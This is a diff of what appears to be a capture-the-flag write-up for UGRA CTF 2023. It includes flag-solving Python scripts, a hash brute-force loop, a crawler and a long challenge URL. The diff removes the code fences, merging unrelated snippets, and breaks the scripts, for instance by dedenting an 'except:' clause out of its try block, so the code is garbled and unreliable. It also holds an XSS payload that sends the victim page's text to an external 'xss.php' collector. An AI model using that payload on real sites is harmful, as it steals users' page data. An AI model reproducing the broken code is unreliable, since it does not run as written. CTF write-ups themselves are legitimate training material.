@@ -221,7 +221,8 @@ o='7faf9ada6e4f4add4b4fff4aeb3e5efada'
 s=o[17:]+o[:17]
 b='deadbeef'
 a0=b*5
-a0=a0[:len(s)]
+a0=a0[:
+len(s)]
 l=int(s,16)^int(a0,16)
 print(long_to_bytes(int(l))[::-1])
 #BJIxBGWyBQHmAJRj
@@ -254,7 +255,8 @@ for a in range(0,10000):
                 reg1 = re.findall('<A HREF=.*?>',r2.text)
                 print(url+"n")
                 break
-    except:
+    
+except:
         pass
 
 最后的路径
@@ -296,108 +298,43 @@ Twitter：@wgpsec
 
 ```
 <script>window.open('http://xxx//xss.php?msg='+encodeURI(document.body.textContent))</script>
-```
-
-
-
-```
 flag[9]='n'
 flag[7]='t'
 flag[5]='a'
-```
-
-
-
-```
 flag[-2:-15:-3].encode().hex() != '396e6b7367'
-```
-
-
-
-```
 for i in range(len(flag1)):
     print(chr(flag1[i]),end="")
-```
-
-
-
-```
 flag[27]='9'
 flag[24]='n'
 flag[21]='k'
 flag[18]='s'
 flag[15]='g'
-```
-
-
-
-```
 flag[-4:].encode()) == b'aXo5aw=='
-```
-
-
-
-```
 flag[28]='k'
 flag[27]='9'
 flag[26]='z'
 flag[25]='i'
-```
-
-
-
-```
 int.from_bytes(flag[6:18:2].encode(), "little") == 104927802781555
-```
-
-
-
-```
 c=104927802781555
 print(hex(c))
 d=[0x5f,0x6e,0x68,0x69,0x6f,0x73]
 for i in range(len(d)):
     print(chr(d[i]),end="")
 e="s0ihn_"
-```
-
-
-
-```
 flag[6]='s'
 flag[8]='o'
 flag[10]='i'
 flag[12]='h'
 flag[14]='n'
 flag[16]='_'
-```
-
-
-
-```
 sum(ord(x) * 1000 ** i for i, x in enumerate(flag[19:-4])) != 110112099107115106
-```
-
-
-
-```
 flag[19]='j'
 flag[20]='s'
 flag[21]='k'
 flag[22]='c'
 flag[23]='p'
 flag[24]='n'
-```
-
-
-
-```
 ugra_astoni0h0ng_wsjskcpniz9k
-```
-
-
-
-```
 import hashlib
 import sys
 flag=[0]*29
@@ -445,37 +382,18 @@ for i in range(32,127):
             if (hashlib.sha256(s.encode()).hexdigest() == '8b488474de448c65a5a8571703bbcc71c4c5e347dca9a86e7277399e00c1e92d'):
                 print(s)
                 break
-```
-
-
-
-```
 ugra_astonishing_wsjskcpniz9k
-```
-
-
-
-```
 ugra_double_security_for_only_50_more_bucks_a16d9gf1gwot
-```
-
-
-
-```
 from Crypto.Util.number import *
 o='7faf9ada6e4f4add4b4fff4aeb3e5efada'
 s=o[17:]+o[:17]
 b='deadbeef'
 a0=b*5
-a0=a0[:len(s)]
+a0=a0[:
+len(s)]
 l=int(s,16)^int(a0,16)
 print(long_to_bytes(int(l))[::-1])
 #BJIxBGWyBQHmAJRj
-```
-
-
-
-```
 import requests
 import re
 
@@ -496,13 +414,9 @@ for a in range(0,10000):
                 reg1 = re.findall('<A HREF=.*?>',r2.text)
                 print(url+"n")
                 break
-    except:
+    
+except:
         pass
-```
-
-
-
-```
 https://depth.q.2023.ugractf.ru/4s026iq4j980bzas/onyx_crab/unexpected_hail/desert_battery/explosive_saxophone/hidden_barnacle/unnecessary_case/ivory_python/obsidian_mermaid/jade_piano/jade_horn/wild_elk/blue_cottonmouth/amber_packet/agate_mare/coral_keyboard/coral_saxophone/ruby_nomad/space_battery/green_weapon/hidden_koala/wild_orca/revealing_tuba/orange_dragon/flying_warning/hunting_cartridge/scheming_device/amber_hammer/inconceivable_cobra/bad_pony/agate_compressor/jet_motherboard/searching_lion/insane_memory/untouchable_orca/coral_tape/flying_foal/urban_drill/urban_lobster/urban_snow/dangerous_trombone/beryl_memory/emerald_memory/chasing_zebra/ivory_viper/flying_sloth/pearl_transistor/green_foal/untouchable_network/uncanny_orca/urban_wildebeest/mountain_device/diamond_piano/nacre_cougar/space_rhythm/red_crab/mountain_hammerhead/jade_sloth/ivory_elk/bad_screwdriver/revealing_viper/bone_beat/spinning_banjo/wild_keyboard/space_lion/deadly_drizzle/bad_captain/chasing_hammer/chasing_griffin/unnecessary_sloth/stalking_tiger/untouchable_inspector/dangerous_yearling/deadly_cheetah/orbiting_troll/obsidian_mainframe/dangerous_case/yellow_weapon/obsidian_barnacle/chasing_cyborg/waning_cottonmouth/desert_tuba/dangerous_tuba/destroyed_cheetah/warring_major/threatening_falcon/nacre_sander/green_unicorn/space_presence/insane_pegasus/bone_presence/wireless_projector/hunting_mainframe/green_gelding/bone_horn/waning_yeti/coral_motherboard/chasing_warning/ivory_projector/glass_song/opal_octopus/hunting_trumpet/onyx_wrench/killer_hail/draconic_warning/chasing_case/obsidian_wildebeest/onyx_vacuum/bad_wrench/wild_trumpet/explosive_storm/green_clarinet/jade_zebra/uncanny_mask/unnecessary_cello/unknown_grizzly/untouchable_clarinet/deadly_elk/diamond_trumpet/inconceivable_jackal/bad_projector/sapphire_packet/diamond_griffin/red_thunder/unexpected_fairy/ruby_drought/decisive_song/decisive_lion/explosive_mainframe/violet_camera/decisive_cougar/mountain_griffin/decisive_gazelle/unknown_tiger/wireless_wildcat/explosive_gelding/flying_major/threatening_trumpet/yellow_storm/jade_commander/jade_drought/hidden_projector/sapphire_lobster/scheming_cello/rowdy_drill/urban_orca/diamond_griffin/revealing_motherboard/rowdy_piccolo/falling_clarinet/untouchable_sound/onyx_octopus/amber_mill/ivory_hammerhead/tarnished_falcon/orbiting_drill/bone_motherboard/orange_griffin/nacre_major/uncanny_cyborg/beryl_projector/orange_deer/bad_yearling/field_battery/uncanny_moose/revealing_drill/uncanny_stallion/mountain_mermaid/urban_cottonmouth/searching_mare/urban_orca/tundra_sander/inconceivable_beat/hidden_camera/emerald_hail/explosive_mill/orange_wizard/desert_lightning/nacre_device/unexpected_rhythm/violet_thunder/nacre_router/warring_sun/mountain_storm/searching_python/agate_cobra/tarnished_door/decisive_device/inconceivable_tiger/tundra_guitar/orbiting_battery/deadly_wrench/uncanny_mixer/sapphire_octopus/stalking_foal/deadly_barnacle/ruby_cobra/explosive_transistor/insane_cottonmouth/bone_cottonmouth/mountain_stag/flying_wildebeest/jade_tiger/wireless_lion/amber_grizzly/opal_mixer/insane_yearling/onyx_dragon/decisive_orca/unnecessary_banjo/unknown_sander/warring_organ/wild_wrench/revealing_warning/orange_lathe/hidden_keyboard/amber_harp/wild_nomad/ruby_colt/decisive_panther/inconceivable_motherboard/inconceivable_chain/diamond_keyboard/urban_mixer/green_commander/blue_leopard/warring_clarinet/insane_router/diamond_clarinet/searching_gazelle/green_trombone/ruby_captain/unexpected_packet/decisive_mermaid/beryl_panther/blue_horse/warring_router/space_warning/bone_snow/field_song/space_android/pearl_banjo/tundra_yeti/tarnished_pilot/covert_fairy/opal_android/hunting_mill/warring_wrench/red_chain/diamond_python/rowdy_cobra/decisive_welder/dangerous_falcon/beryl_screwdriver/explosive_trombone/glass_cup/spinning_keyboard/yellow_lion/agate_dragon/unknown_weapon/agate_drum/draconic_android/draconic_vacuum/tarnished_lion/untouchable_clarinet/insane_rhythm/warring_griffin/falling_cartridge/chasing_pegasus/waning_thunder/jet_cello/hunting_mixer/jade_screwdriver/hidden_sidewinder/field_screwdriver/field_warning/yellow_falcon/mountain_wizard/uncanny_drizzle/violet_door/inconceivable_wildcat/opal_chain/desert_banjo/unexpected_piranha/deadly_android/threatening_mare/spinning_hail/flying_harp/warring_harp/ivory_mill/opal_violin/draconic_memory/orange_yeti/emerald_sloth/opal_drum/unexpected_battery/explosive_hammer/onyx_mixer/deadly_rhythm/rowdy_general/space_piccolo/unknown_pony/searching_hammerhead/onyx_snow/hunting_filly/orange_lightning/obsidian_tiger/glass_ink/falling_colt/tarnished_falcon/threatening_wildcat/threatening_stag/decisive_filly/nacre_drizzle/threatening_battery/ivory_tape/pearl_drum/orbiting_hammerhead/searching_camera/unnecessary_network/nacre_yeti/orange_sander/yellow_zebra/beryl_general/stalking_tape/decisive_memory/diamond_orca/chasing_mermaid/orbiting_boa/obsidian_drizzle/desert_guitar/sapphire_mask/nacre_cornet/waning_drizzle/revealing_panther/orbiting_lobster/wireless_robot/spinning_cleric/falling_door/flying_stallion/spinning_trombone/orbiting_lion/onyx_tuba/searching_commander/yellow_lion/blue_screwdriver/chasing_warning/wireless_general/waning_warning/explosive_vacuum/killer_banjo/jade_inspector/blue_song/stalking_trombone/inconceivable_horn/obsidian_lion/orbiting_disk/jade_dragon/draconic_tuba/coral_chef/wireless_storm/insane_deer/blue_sun/waning_trombone/emerald_android/rowdy_leopard/deadly_wizard/beryl_griffin/falling_packet/insane_gazelle/uncanny_piranha/diamond_screwdriver/falling_cornet/mountain_harp/searching_wildebeest/desert_stag/beryl_lion/killer_captain/explosive_tuba/tundra_general/space_weapon/coral_wildebeest/bad_tuba/unexpected_falcon/agate_projector/field_welder/stalking_clarinet/amber_gelding/destroyed_drill/searching_projector/rowdy_storm/revealing_sloth/flying_rhythm/field_door/dangerous_stallion/ivory_cup/rowdy_storm/hunting_general/blue_guitar/agate_tape/destroyed_network/glass_horn/spinning_inspector/orange_pilot/yellow_gelding/falling_crab/glass_orca/violet_dragon/yellow_trombone/revealing_case/falling_leopard/opal_cougar/obsidian_device/nacre_sander/wild_python/onyx_harp/draconic_network/uncanny_foal/jade_robot/diamond_storm/killer_motherboard/obsidian_vacuum/ruby_mermaid/spinning_violin/uncanny_drill/bad_hail/flying_orca/revealing_robot/unnecessary_filly/destroyed_display/obsidian_warning/ruby_stag/onyx_hail/beryl_python/decisive_horse/dangerous_tiger/field_wrench/untouchable_mill/wild_stag/red_projector/nacre_device/beryl_tape/chasing_lion/bad_warning/pearl_welder/wild_sound/beryl_zebra/draconic_nomad/dangerous_griffin/bone_hammer/desert_hammer/space_player/desert_clarinet/warring_clarinet/revealing_clarinet/tundra_pilot/inconceivable_gelding/inconceivable_case/insane_wildebeest/wireless_cyborg/waning_stag/green_pegasus/mountain_jackal/blue_harp/hunting_horn/field_chef/chasing_cyborg/spinning_octopus/jet_rain/hunting_crab/mountain_stallion/field_zebra/searching_viper/bone_drizzle/green_stallion/diamond_grizzly/diamond_network/decisive_tape/blue_lobster/amber_welder/searching_yearling/hidden_battery/amber_thunder/explosive_harp/spinning_piccolo/urban_drum/tarnished_wildebeest/emerald_boa/rowdy_pony/hunting_cleric/space_orca/violet_general/scheming_elk/bone_storm/searching_hail/ivory_wrench/orbiting_saxophone/decisive_wrench/tarnished_filly/violet_device/jade_compressor/
 ```
 
